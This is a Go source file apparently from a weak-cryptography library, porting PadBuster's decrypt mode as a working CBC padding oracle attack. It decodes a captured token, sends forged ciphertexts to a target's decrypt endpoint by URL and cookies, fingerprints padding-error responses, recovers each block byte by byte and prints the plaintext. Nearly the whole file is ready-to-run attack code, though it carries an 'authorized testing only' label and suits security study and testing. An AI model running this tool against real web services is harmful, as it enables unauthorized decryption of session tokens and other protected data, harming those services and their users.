// padding-oracle.go
// Go port of PadBuster v0.3.3 decrypt mode, as a library for libs/weak-cryptography.
// FOR EDUCATION / AUTHORIZED TESTING ONLY.
package weakcryptography

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"time"
)

// PaddingOracleOptions configures the padding oracle attack.
type PaddingOracleOptions struct {
	Token     string   // captured ciphertext sample
	Encoding  int      // 0=Base64 1=Lower HEX 2=Upper HEX 3=.NET UrlToken 4=WebSafe Base64
	ErrorMsg  string   // string present in responses with a padding error (optional)
	BlockSize int      // cipher block size
	Cookies   []string // "name=value" entries; the sample token is substituted into each
}

type oracle struct {
	client    *http.Client
	base      string
	cookies   []string
	sample    string
	encoding  int
	blockSize int
	errorMsg  string
	signature string
}

var toStd = strings.NewReplacer("-", "+", "_", "/")
var toWeb = strings.NewReplacer("+", "-", "/", "_")

func decodeSample(s string, enc int) ([]byte, error) {
	switch enc {
	case 0:
		return base64.StdEncoding.DecodeString(s)
	case 1, 2:
		return hex.DecodeString(strings.ToLower(s))
	case 3: // .NET UrlToken: trailing digit = number of '=' removed
		if len(s) < 2 {
			return nil, fmt.Errorf("token too short for .NET UrlToken")
		}
		n := int(s[len(s)-1] - '0')
		return base64.StdEncoding.DecodeString(toStd.Replace(s[:len(s)-1]) + strings.Repeat("=", n))
	case 4: // WebSafe Base64
		t := toStd.Replace(s)
		if m := len(t) % 4; m != 0 {
			t += strings.Repeat("=", 4-m)
		}
		return base64.StdEncoding.DecodeString(t)
	}
	return nil, fmt.Errorf("encoding must be 0-4")
}

func encodeSample(b []byte, enc int) string {
	switch enc {
	case 1:
		return hex.EncodeToString(b)
	case 2:
		return strings.ToUpper(hex.EncodeToString(b))
	case 3:
		s := base64.StdEncoding.EncodeToString(b)
		n := strings.Count(s, "=")
		return toWeb.Replace(strings.TrimRight(s, "=")) + strconv.Itoa(n)
	case 4:
		return toWeb.Replace(strings.TrimRight(base64.StdEncoding.EncodeToString(b), "="))
	}
	return base64.StdEncoding.EncodeToString(b)
}

// send performs one request; returns signature (status/length/location) and body.
func (o *oracle) send(enc string) (string, string, error) {
	req, err := http.NewRequest(http.MethodGet, o.base+"?token="+url.QueryEscape(enc), nil)
	if err != nil {
		return "", "", err
	}
	if len(o.cookies) > 0 {
		parts := make([]string, 0, len(o.cookies))
		for _, c := range o.cookies {
			parts = append(parts, strings.ReplaceAll(c, o.sample, enc))
		}
		req.Header.Set("Cookie", strings.Join(parts, "; "))
	}
	var resp *http.Response
	for attempt := 1; attempt <= 3; attempt++ {
		if resp, err = o.client.Do(req); err == nil {
			break
		}
		fmt.Printf("ERROR: %v - retrying...\n", err)
		time.Sleep(2 * time.Second)
	}
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}
	loc := resp.Header.Get("Location")
	if loc == "" {
		loc = "N/A"
	}
	return fmt.Sprintf("%d\t%d\t%s", resp.StatusCode, len(data), loc), string(data), nil
}

// check returns true when the server did NOT report a padding error.
func (o *oracle) check(enc string) (bool, error) {
	sig, body, err := o.send(enc)
	if err != nil {
		return false, err
	}
	if o.errorMsg != "" {
		return !strings.Contains(body, o.errorMsg), nil
	}
	return sig != o.signature, nil
}

// analyze finds the padding-error signature when no error message is given.
func (o *oracle) analyze(cur []byte) error {
	counts := map[string]int{}
	for i := 0; i < 256; i++ {
		test := make([]byte, o.blockSize)
		test[o.blockSize-1] = byte(i)
		sig, _, err := o.send(encodeSample(append(test, cur...), o.encoding))
		if err != nil {
			return err
		}
		counts[sig]++
	}
	if len(counts) == 1 {
		return fmt.Errorf("all responses identical; provide --error-msg")
	}
	sigs := make([]string, 0, len(counts))
	for s := range counts {
		sigs = append(sigs, s)
	}
	sort.Slice(sigs, func(i, j int) bool { return counts[sigs[i]] > counts[sigs[j]] })
	fmt.Println("Response signatures (status, length, location):")
	for _, s := range sigs {
		fmt.Printf("  %5d x  %s\n", counts[s], strings.ReplaceAll(s, "\t", " | "))
	}
	o.signature = sigs[0]
	fmt.Printf("[+] Padding-error signature = most frequent (%d/256)\n\n", counts[sigs[0]])
	return nil
}

// blockIntermediate recovers D_k(cur) byte by byte (PadBuster processBlock).
//
// The scan runs from 0xff down to 0x00 and the first accepted candidate wins,
// exactly like PadBuster. There is deliberately no extra confirm request on
// the last byte of a block: flipping a neighbouring byte of the forged block
// also changes the decrypted plaintext, so an oracle that folds unrelated
// failures (a UTF-8 decode error on the recovered plaintext, for instance) into
// its padding-error response would reject a genuine hit. PadBuster leaves that
// ambiguity to its interactive mode; so do we.
func (o *oracle) blockIntermediate(cur []byte) ([]byte, error) {
	bs := o.blockSize
	test := make([]byte, bs)
	inter := make([]byte, bs)
	for pos := bs - 1; pos >= 0; pos-- {
		pad := byte(bs - pos)
		found := false
		for i := 255; i >= 0; i-- {
			test[pos] = byte(i)
			valid, err := o.check(encodeSample(append(append([]byte{}, test...), cur...), o.encoding))
			if err != nil {
				return nil, err
			}
			if !valid {
				continue
			}
			inter[pos] = byte(i) ^ pad
			found = true
			break
		}
		if !found {
			return nil, fmt.Errorf("no valid response for byte %d", pos)
		}
		for k := pos; k < bs; k++ {
			test[k] ^= pad ^ (pad + 1)
		}
	}
	return inter, nil
}

// oracleBase derives the oracle endpoint from the target URL.
// The given URL is usually the encrypt endpoint (e.g. /encrypt?data=...),
// so "/encrypt" is swapped for "/decrypt" and the query string is dropped.
func oracleBase(rawURL, port string) (string, error) {
	if !strings.Contains(rawURL, "://") {
		rawURL = "http://" + rawURL
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	host := u.Hostname()
	if port != "" {
		host = host + ":" + port
	} else if u.Port() != "" {
		host = host + ":" + u.Port()
	}
	path := u.Path
	if strings.HasSuffix(path, "/encrypt") {
		path = strings.TrimSuffix(path, "/encrypt") + "/decrypt"
	}
	return u.Scheme + "://" + host + path, nil
}

// PaddingOracle decrypts a CBC token through a padding oracle.
func PaddingOracle(rawURL, port string, opts PaddingOracleOptions) {
	if opts.Token == "" {
		fmt.Println("ERROR: --token is required")
		return
	}
	if opts.Encoding < 0 || opts.Encoding > 4 {
		fmt.Println("ERROR: --encoding must be between 0 and 4")
		return
	}
	base, err := oracleBase(rawURL, port)
	if err != nil {
		fmt.Println("ERROR: invalid URL:", err)
		return
	}

	bs := opts.BlockSize
	o := &oracle{
		client: &http.Client{Timeout: 30 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		}},
		base:      base,
		cookies:   opts.Cookies,
		sample:    opts.Token,
		encoding:  opts.Encoding,
		blockSize: bs,
		errorMsg:  opts.ErrorMsg,
	}
	fmt.Println("[+] Oracle endpoint:", base)

	ct, err := decodeSample(opts.Token, opts.Encoding)
	if err != nil {
		fmt.Println("ERROR: cannot decode token:", err)
		return
	}
	if bs <= 0 || len(ct) == 0 || len(ct)%bs != 0 || len(ct) < 2*bs {
		fmt.Printf("ERROR: decoded token is %d bytes; must be a multiple of %d and at least 2 blocks\n", len(ct), bs)
		return
	}

	sig, body, err := o.send(opts.Token)
	if err != nil {
		fmt.Println("ERROR:", err)
		return
	}
	fmt.Printf("[+] Original request: %s\n    body: %.120s\n\n", strings.ReplaceAll(sig, "\t", " | "), body)

	if opts.ErrorMsg == "" {
		if err := o.analyze(ct[bs : 2*bs]); err != nil {
			fmt.Println("ERROR:", err)
			return
		}
	}

	var plain []byte
	for b := 1; b < len(ct)/bs; b++ {
		prev := ct[(b-1)*bs : b*bs]
		cur := ct[b*bs : (b+1)*bs]
		inter, err := o.blockIntermediate(cur)
		if err != nil {
			fmt.Println("ERROR:", err)
			return
		}
		pt := make([]byte, bs)
		for i := range pt {
			pt[i] = inter[i] ^ prev[i]
		}
		fmt.Printf("Block %d  plaintext: %q  hex: %x\n", b, pt, pt)
		plain = append(plain, pt...)
	}

	fmt.Println("\n==== Decrypted (raw, includes padding) ====")
	fmt.Printf("ASCII : %q\n", plain)
	fmt.Printf("HEX   : %x\n", plain)
	fmt.Printf("Base64: %s\n", base64.StdEncoding.EncodeToString(plain))
}
